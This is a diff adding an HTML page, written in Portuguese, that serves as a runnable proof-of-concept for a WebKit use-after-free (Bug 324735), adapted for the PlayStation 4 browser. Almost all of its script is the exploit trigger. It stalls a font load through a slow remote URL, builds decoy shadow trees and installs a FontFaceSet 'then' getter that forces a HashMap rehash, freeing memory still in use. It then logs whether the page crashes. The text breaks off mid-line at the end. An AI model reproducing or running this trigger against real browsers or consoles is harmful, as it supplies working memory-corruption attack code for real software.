@@ -1,53 +1,638 @@
 <!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>WebKit UAF — Bug 324735</title>
+<style>
+  :root {
+    --bg:       #0d1117;
+    --surface:  #161b22;
+    --border:   #30363d;
+    --ok:       #3fb950;
+    --fail:     #f85149;
+    --warn:     #d29922;
+    --pass:     #58a6ff;
+    --muted:    #8b949e;
+    --text:     #e6edf3;
+    --mono:     "Courier New", Courier, monospace;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 20px;
+    line-height: 1.6;
+    padding: 48px 60px;
+    min-height: 100vh;
+  }
+
+  header {
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 28px;
+    margin-bottom: 36px;
+  }
+
+  .title {
+    font-size: 26px;
+    font-weight: bold;
+    color: var(--pass);
+    letter-spacing: 0.04em;
+  }
+
+  .subtitle {
+    color: var(--muted);
+    font-size: 17px;
+    margin-top: 6px;
+  }
+
+  .badge {
+    display: inline-block;
+    font-size: 13px;
+    padding: 2px 10px;
+    border-radius: 4px;
+    border: 1px solid var(--border);
+    color: var(--muted);
+    margin-top: 10px;
+  }
+
+  .panel {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 24px 28px;
+    margin-bottom: 24px;
+  }
+
+  .panel-title {
+    font-size: 15px;
+    color: var(--muted);
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    margin-bottom: 16px;
+  }
+
+  #log {
+    min-height: 120px;
+    max-height: 540px;
+    overflow-y: auto;
+  }
+
+  .log-line {
+    display: flex;
+    gap: 16px;
+    padding: 3px 0;
+    font-size: 19px;
+    border-bottom: 1px solid rgba(48,54,61,0.4);
+  }
+
+  .log-line:last-child { border-bottom: none; }
+
+  .log-ts   { color: var(--muted); flex-shrink: 0; min-width: 70px; }
+  .log-msg  { color: var(--text); }
+  .log-ok   .log-msg { color: var(--ok); }
+  .log-fail .log-msg { color: var(--fail); }
+  .log-warn .log-msg { color: var(--warn); }
+  .log-pass .log-msg { color: var(--pass); font-weight: bold; }
+  .log-step .log-msg { color: var(--text); }
+  .log-sub  .log-msg { color: var(--muted); padding-left: 20px; }
+
+  .status-box {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    font-size: 22px;
+    font-weight: bold;
+    padding: 18px 24px;
+    border-radius: 6px;
+    border: 2px solid var(--border);
+    margin-bottom: 24px;
+    transition: border-color 0.3s, background 0.3s;
+  }
+
+  .status-box.idle    { border-color: var(--border);  background: var(--surface); }
+  .status-box.running { border-color: var(--warn);    background: rgba(210,153,34,0.08); }
+  .status-box.alive   { border-color: var(--ok);      background: rgba(63,185,80,0.08); }
+  .status-box.crashed { border-color: var(--fail);    background: rgba(248,81,73,0.08); }
+
+  .dot {
+    width: 14px; height: 14px;
+    border-radius: 50%;
+    flex-shrink: 0;
+    background: var(--muted);
+  }
+  .status-box.idle    .dot { background: var(--muted); }
+  .status-box.running .dot { background: var(--warn); animation: pulse 1s infinite; }
+  .status-box.alive   .dot { background: var(--ok); }
+  .status-box.crashed .dot { background: var(--fail); }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50%       { opacity: 0.3; }
+  }
+
+  .btn {
+    display: inline-block;
+    background: var(--pass);
+    color: #0d1117;
+    font-family: var(--mono);
+    font-size: 20px;
+    font-weight: bold;
+    padding: 14px 36px;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+    letter-spacing: 0.04em;
+    margin-right: 16px;
+    margin-top: 8px;
+  }
+
+  .btn:hover   { opacity: 0.85; }
+  .btn:active  { opacity: 0.7; }
+  .btn.red     { background: var(--fail); }
+  .btn:disabled { opacity: 0.35; cursor: default; }
+
+  .config-row {
+    display: flex;
+    gap: 32px;
+    flex-wrap: wrap;
+    margin-bottom: 8px;
+  }
+
+  .config-item {
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+    flex: 1;
+    min-width: 240px;
+  }
+
+  .config-label {
+    font-size: 14px;
+    color: var(--muted);
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+  }
+
+  .config-val {
+    font-size: 17px;
+    color: var(--ok);
+    word-break: break-all;
+  }
+
+  .sep {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 20px 0;
+  }
+
+  #preflightGrid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 10px;
+  }
+
+  .pf-item {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 17px;
+    padding: 8px 12px;
+    border-radius: 4px;
+    background: rgba(255,255,255,0.03);
+  }
+
+  .pf-ok   { color: var(--ok); }
+  .pf-fail { color: var(--fail); }
+  .pf-icon { flex-shrink: 0; font-style: normal; }
+</style>
+</head>
 <body>
+
+<header>
+  <div class="title">WebKit UAF — Style::Scope::createOrFindSharedShadowTreeResolver</div>
+  <div class="subtitle">HashMap::ensure() rehash via FontFaceSet.prototype.then getter — PoC adaptado para PS4</div>
+  <div class="badge">bugs.webkit.org/show_bug.cgi?id=324735 · AppleWebKit/605.1.15</div>
+</header>
+
+<div class="status-box idle" id="statusBox">
+  <span class="dot"></span>
+  <span id="statusText">Aguardando execução</span>
+</div>
+
+<div class="panel">
+  <div class="panel-title">Configuração</div>
+  <div class="config-row">
+    <div class="config-item">
+      <span class="config-label">Font URL (stalling)</span>
+      <span class="config-val" id="cfgFontUrl">—</span>
+    </div>
+    <div class="config-item">
+      <span class="config-label">Decoy count (rehash trigger)</span>
+      <span class="config-val" id="cfgDecoy">32</span>
+    </div>
+    <div class="config-item">
+      <span class="config-label">Font family</span>
+      <span class="config-val" id="cfgFamily">—</span>
+    </div>
+    <div class="config-item">
+      <span class="config-label">Stall delay</span>
+      <span class="config-val" id="cfgDelay">30 s</span>
+    </div>
+  </div>
+</div>
+
+<div class="panel">
+  <div class="panel-title">Pre-flight checks</div>
+  <div id="preflightGrid">
+    <div class="pf-item" id="pf-shadow">
+      <i class="pf-icon">⬜</i> Shadow DOM (attachShadow)
+    </div>
+    <div class="pf-item" id="pf-fonts">
+      <i class="pf-icon">⬜</i> document.fonts (FontFaceSet)
+    </div>
+    <div class="pf-item" id="pf-css-ctor">
+      <i class="pf-icon">⬜</i> new CSSStyleSheet()
+    </div>
+    <div class="pf-item" id="pf-replace-sync">
+      <i class="pf-icon">⬜</i> CSSStyleSheet.replaceSync()
+    </div>
+    <div class="pf-item" id="pf-adopted">
+      <i class="pf-icon">⬜</i> adoptedStyleSheets
+    </div>
+    <div class="pf-item" id="pf-then-cfg">
+      <i class="pf-icon">⬜</i> FontFaceSet.prototype.then configurável
+    </div>
+  </div>
+</div>
+
+<div class="panel">
+  <div class="panel-title">Log de execução</div>
+  <div id="log"></div>
+</div>
+
+<button class="btn" id="btnRun" onclick="runTest()">▶ Executar PoC</button>
+<button class="btn" id="btnReset" onclick="resetTest()">↺ Resetar</button>
+
+<!-- Hidden container para os shadow hosts -->
+<div id="shadowContainer" style="position:absolute;left:-9999px;top:0;width:1px;height:1px;overflow:hidden;"></div>
+
 <script>
-// Precondi��o: tocar document.fonts antes do load event
-document.fonts;
+"use strict";
 
-window.addEventListener("load", () => setTimeout(() => {
+// ─── Configuração ────────────────────────────────────────────────────────────
+
+const DECOY_COUNT  = 32;
+const FONT_FAMILY  = "PS4UAFFont_" + Math.floor(Math.random() * 0xFFFF).toString(16);
+const STALL_MS     = 30000;
+const FONT_URL     = "https://slowfil.es/file?type=woff&delay=" + STALL_MS + "&r=" + Math.random().toString(36).slice(2);
+
+document.getElementById("cfgFontUrl").textContent = FONT_URL;
+document.getElementById("cfgDecoy").textContent   = DECOY_COUNT;
+document.getElementById("cfgFamily").textContent  = FONT_FAMILY;
+document.getElementById("cfgDelay").textContent   = (STALL_MS / 1000) + " s";
+
+// ─── Logging ─────────────────────────────────────────────────────────────────
+
+const logEl    = document.getElementById("log");
+const startMs  = Date.now();
+
+function log(msg, type) {
+  const elapsed = ((Date.now() - startMs) / 1000).toFixed(2);
+  const line = document.createElement("div");
+  line.className = "log-line log-" + (type || "step");
+  line.innerHTML =
+    '<span class="log-ts">+' + elapsed + 's</span>' +
+    '<span class="log-msg">' + escHtml(msg) + '</span>';
+  logEl.appendChild(line);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+function escHtml(s) {
+  return String(s)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;");
+}
+
+// ─── Status box ──────────────────────────────────────────────────────────────
+
+function setStatus(state, msg) {
+  const box = document.getElementById("statusBox");
+  box.className = "status-box " + state;
+  document.getElementById("statusText").textContent = msg;
+}
+
+// ─── Pre-flight ──────────────────────────────────────────────────────────────
+
+function pfMark(id, ok, detail) {
+  const el   = document.getElementById(id);
+  const icon = el.querySelector(".pf-icon");
+  el.classList.toggle("pf-ok",   ok);
+  el.classList.toggle("pf-fail", !ok);
+  icon.textContent = ok ? "✓" : "✗";
+  if (detail) el.textContent = icon.textContent + " " + el.textContent.slice(2).trim() + " — " + detail;
+}
+
+function runPreflight() {
+  const results = {};
+
+  results["pf-shadow"] = !!HTMLElement.prototype.attachShadow;
+
+  results["pf-fonts"]  = !!document.fonts &&
+    typeof document.fonts.load === "function" &&
+    typeof document.fonts.ready !== "undefined";
+
+  try {
+    new CSSStyleSheet();
+    results["pf-css-ctor"] = true;
+  } catch(e) {
+    results["pf-css-ctor"] = false;
+  }
+
+  try {
+    const s = new CSSStyleSheet();
+    s.replaceSync("a{}");
+    results["pf-replace-sync"] = true;
+  } catch(e) {
+    results["pf-replace-sync"] = false;
+  }
+
+  try {
+    const h = document.createElement("div");
+    document.body.appendChild(h);
+    const r = h.attachShadow({ mode: "open" });
+    r.adoptedStyleSheets = [];
+    document.body.removeChild(h);
+    results["pf-adopted"] = true;
+  } catch(e) {
+    results["pf-adopted"] = false;
+  }
+
+  if (document.fonts) {
+    const desc = Object.getOwnPropertyDescriptor(FontFaceSet.prototype, "then");
+    // ok se: não existe (FontFaceSet não é thenable) OU é configurável
+    results["pf-then-cfg"] = !desc || (desc.configurable === true);
+  } else {
+    results["pf-then-cfg"] = false;
+  }
+
+  let allOk = true;
+  for (const [id, ok] of Object.entries(results)) {
+    pfMark(id, ok);
+    if (!ok) allOk = false;
+  }
+
+  return allOk;
+}
+
+// ─── Estado do teste ─────────────────────────────────────────────────────────
+
+let gadgetStyleInB = null;
+let elementInB     = null;
+let readyPromise   = null;
+const decoyStyles  = [];
+const decoyRoots   = [];
+const decoySheets  = [];
+let aliveTimer     = null;
+let running        = false;
+const container    = document.getElementById("shadowContainer");
+
+function clearState() {
+  gadgetStyleInB = null;
+  elementInB     = null;
+  readyPromise   = null;
+  decoyStyles.length = 0;
+  decoyRoots.length  = 0;
+  decoySheets.length = 0;
+  container.innerHTML = "";
+  if (aliveTimer) { clearTimeout(aliveTimer); aliveTimer = null; }
+}
+
+// ─── Setup ───────────────────────────────────────────────────────────────────
+
+function setup() {
+  log("Criando stylesheet com @font-face stalling...", "step");
+
+  const fontFaceSheet = new CSSStyleSheet();
+  fontFaceSheet.replaceSync(
+    `@font-face { font-family: ${FONT_FAMILY}; src: url("${FONT_URL}"); }`
+  );
+
+  const extraSheet = new CSSStyleSheet();
+  extraSheet.replaceSync(".marker { color: green; }");
+
+  for (let i = 0; i < DECOY_COUNT; ++i) {
+    const sheet = new CSSStyleSheet();
+    sheet.replaceSync(`.decoy${i} { color: rgb(${i},1,2); }`);
+    decoySheets.push(sheet);
+  }
+
+  // Shadow tree A — renderizado, usa a fonte stalling (sobe o active count)
+  log("Criando shadow tree A (rendered + fonte stalling)...", "sub");
+  const hostA = document.createElement("div");
+  container.appendChild(hostA);
+  const rootA = hostA.attachShadow({ mode: "open" });
+  rootA.adoptedStyleSheets = [fontFaceSheet];
+  const probe = document.createElement("span");
+  probe.style.font = `24px ${FONT_FAMILY}`;
+  probe.textContent = "A";
+  rootA.appendChild(probe);
+
+  // Shadow tree B — resolver será reconstruído pelo attribute change no trigger()
+  // A remoção do <style> interno força full resolver reconstruction
+  log("Criando shadow tree B (alvo da reconstrução)...", "sub");
+  const hostB = document.createElement("div");
+  hostB.style.display = "none";
+  container.appendChild(hostB);
+  const rootB = hostB.attachShadow({ mode: "open" });
+  gadgetStyleInB = document.createElement("style");
+  gadgetStyleInB.textContent = ".gadget { color: navy; }";
+  rootB.appendChild(gadgetStyleInB);
+  const wrapperInB = document.createElement("div");
+  elementInB = document.createElement("span");
+  elementInB.textContent = "B";
+  wrapperInB.appendChild(elementInB);
+  rootB.appendChild(wrapperInB);
+  rootB.adoptedStyleSheets = [fontFaceSheet, extraSheet];
+
+  // N shadow trees decoy — serão reconstruídos no getter para causar o rehash
+  log(`Criando ${DECOY_COUNT} shadow trees decoy (para forçar rehash)...`, "sub");
+  for (let i = 0; i < DECOY_COUNT; ++i) {
     const host = document.createElement("div");
-    document.body.appendChild(host);
-    const shadow = host.attachShadow({ mode: "open" });
-
-    // @font-face numa shadow root � dispara o pipeline de loading
+    host.style.display = "none";
+    container.appendChild(host);
+    const root = host.attachShadow({ mode: "open" });
     const style = document.createElement("style");
-    style.textContent = `
-        @font-face { font-family: f; src: url("x.otf"); }
-        .p { font: 24px f; }`;
-    shadow.appendChild(style);
+    style.textContent = `.decoyGadget${i} { color: rgb(1,${i},3); }`;
+    root.appendChild(style);
+    const wrapper = document.createElement("div");
+    wrapper.appendChild(document.createElement("span"));
+    root.appendChild(wrapper);
+    decoyRoots.push(root);
+    decoyStyles.push(style);
+  }
 
-    const span = document.createElement("span");
-    span.className = "p";
-    span.textContent = "A";
-    shadow.appendChild(span);
+  // Força layout: constrói todos os resolvers com a fonte ainda pendente
+  log("Forçando layout pass inicial (constrói resolvers)...", "step");
+  void container.offsetHeight;
 
-    // For�a layout ? inicia font load
-    document.body.offsetHeight;
-    document.fonts.load("24px f", "A");
+  // Registra a fonte como "loading" (active count → 1)
+  log(`Disparando document.fonts.load() para '24px ${FONT_FAMILY}'...`, "step");
+  document.fonts.load(`24px ${FONT_FAMILY}`, "A");
 
-    // Materializa a promise ready para que settling passe por JSPromise::resolve
-    document.fonts.ready;
+  const status = document.fonts.status;
+  log(`document.fonts.status = "${status}"`, status === "loading" ? "ok" : "fail");
 
-    // Prepend (n�o append) ? for�a analyzeStyleSheetChange a escolher Reset
-    // Reset re-processa @font-face ? pode zerar o contador de loading fonts
-    const extra = document.createElement("style");
-    extra.textContent = ".x { color: red; }";
-    shadow.prepend(extra);
+  if (status !== "loading") {
+    log("ERRO: fonte não está em estado loading — URL pode ter carregado ou rejeitado.", "fail");
+    return false;
+  }
 
-    // Intercepta o .then do FontFaceSet para remover o host durante a itera��o
-    Object.defineProperty(FontFaceSet.prototype, "then", {
-        configurable: true,
-        get() {
-            delete FontFaceSet.prototype.then;
-            host.remove(); // ? libera o n� que o iterator aponta
-            return undefined;
+  // Materializa o promise ANTES do trigger para que a promise resolution
+  // consulte a propriedade "then" quando for settled
+  readyPromise = document.fonts.ready;
+  log("readyPromise materializado (document.fonts.ready).", "ok");
+  return true;
+}
+
+// ─── Trigger ─────────────────────────────────────────────────────────────────
+
+function trigger() {
+  if (document.fonts.status !== "loading") {
+    log("FALHA: fonte carregou antes do trigger. Aumentar STALL_MS.", "fail");
+    return;
+  }
+
+  log("Instalando getter trap em FontFaceSet.prototype.then...", "step");
+  log("  Quando disparado: força rebuild dos decoys → rehash do HashMap.", "sub");
+
+  const originalThen = Object.getOwnPropertyDescriptor(FontFaceSet.prototype, "then");
+
+  Object.defineProperty(FontFaceSet.prototype, "then", {
+    configurable: true,
+    get() {
+      // Restaura imediatamente para não afetar execuções futuras
+      if (originalThen)
+        Object.defineProperty(FontFaceSet.prototype, "then", originalThen);
+      else
+        delete FontFaceSet.prototype.then;
+
+      log("→ getter disparado no meio do HashMap::ensure()!", "warn");
+      log("  Forçando layout: reconstrói decoys, cresce m_sharedShadowTreeResolvers...", "warn");
+
+      // Este offsetHeight constrói os N resolvers pendentes dos decoys
+      // fazendo o HashMap crescer além do load factor → rehash → free da backing store
+      void document.body.offsetHeight;
+
+      log("  getter retornando undefined (continua a promise resolution)...", "sub");
+      return undefined; // não é thenable → resolution prossegue
+    }
+  });
+
+  // Agenda reconstrução para todos os decoys (sem flush ainda)
+  log(`Agendando invalidação de ${DECOY_COUNT} decoys + shadow tree B...`, "step");
+  for (let i = 0; i < DECOY_COUNT; ++i) {
+    decoyRoots[i].adoptedStyleSheets = [decoySheets[i]];
+    decoyStyles[i].remove(); // remove <style> → força full resolver reconstruction
+  }
+  gadgetStyleInB.remove(); // idem para B
+
+  // Flush — invalida todos os resolvers deixando shadow trees "sem resolver"
+  log("Flush via document.styleSheets.length...", "step");
+  void document.styleSheets.length;
+
+  // A mudança de atributo em elementInB dispara a reconstrução do resolver de B.
+  // createOrFindSharedShadowTreeResolver() é chamado →
+  //   appendAuthorStyleSheets() re-registra @font-face →
+  //     active count cai para 0 →
+  //       document.fonts.ready settle →
+  //         consulta FontFaceSet.prototype.then →
+  //           getter executa → rehash →
+  //             backing store liberada
+  //   HashMap::ensure() ainda segura ponteiro na backing store velha → UAF ☠️
+  log("Triggering: elementInB.id = 'boom' (inicia createOrFindSharedShadowTreeResolver)...", "step");
+  elementInB.id = "boom";
+
+  // Se chegou aqui o UAF não causou crash imediato (silent corruption ou versão patchada)
+  log("Retornou do trigger. Sem crash síncrono.", "pass");
+  log("Possível heap corruption silenciosa ou versão já patchada.", "warn");
+}
+
+// ─── Orquestração principal ───────────────────────────────────────────────────
+
+function runTest() {
+  if (running) return;
+  running = true;
+
+  document.getElementById("btnRun").disabled   = true;
+  document.getElementById("btnReset").disabled = false;
+  document.getElementById("log").innerHTML     = "";
+
+  log("=== PS4 WebKit UAF PoC — Bug 324735 ===", "step");
+  log("Style::Scope::createOrFindSharedShadowTreeResolver", "sub");
+  log("HashMap::ensure() rehash via FontFaceSet.prototype.then getter", "sub");
+
+  setStatus("running", "Executando pre-flight checks...");
+
+  const ok = runPreflight();
+  if (!ok) {
+    log("Pre-flight falhou — uma ou mais APIs necessárias ausentes.", "fail");
+    setStatus("alive", "Pre-flight falhou — APIs ausentes no PS4 WebKit");
+    running = false;
+    document.getElementById("btnRun").disabled = false;
+    return;
+  }
+
+  log("Pre-flight OK.", "ok");
+  setStatus("running", "Aguardando window.load para iniciar setup...");
+
+  // O teste usa setTimeout após window.load, igual ao original do WebKit,
+  // para garantir que document.fonts pode observar o documento terminando de carregar.
+  document.fonts; // referencia o FontFaceSet durante o parsing (necessário para .ready)
+
+  function afterLoad() {
+    setStatus("running", "Executando setup...");
+    setTimeout(() => {
+      log("--- SETUP ---", "step");
+      let setupOk = false;
+      try {
+        setupOk = setup();
+      } catch(e) {
+        log("Exceção no setup: " + e, "fail");
+        setStatus("alive", "Erro no setup");
+        running = false;
+        document.getElementById("btnRun").disabled = false;
+        return;
+      }
+
+      if (!setupOk) {
+        setStatus("alive", "Setup falhou — verificar URL da fonte");
+        running = false;
+        document.getElementById("btnRun").disabled = false;
+        return;
+      }
+
+      setStatus("running", "Setup OK — aguardando trigger...");
+
+      // Instala detecção de "ainda vivo" com timeout
+      // Se o PS4 crashar silenciosamente o timeout não vai disparar
+      aliveTimer = setTimeout(() => {
+        setStatus("alive", "Página ainda viva após 5 s — sem crash");
+        log("Timeout: página ainda respondendo após 5 s do trigger.", "ok");
+      }, 5000);
+
+      setTimeout(() => {
+        log("--- TRIGGER ---", "step");
+        setStatus("running", "Trigger em execução...");
+        try {
+          trigger();
+        } catch(e) {
+          log("Exceção capturada no trigger: " + e, "fail");
+          log("(JS exceptions não indicam UAF — crash/freeze é o sinal.)", "sub");
+          setStatus("alive", "Exceção JS capturada — sem crash de processo");
         }
-    });
-
-    // Trigger: acesso a document.styleSheets chama flushPendingDescendantUpdates
-    document.styleSheets.length;
-
-    document.body.append("alive � sem crash");
-}, 0));
-</script>
-</body>
+        setStatus("running", "Aguardando resposta 
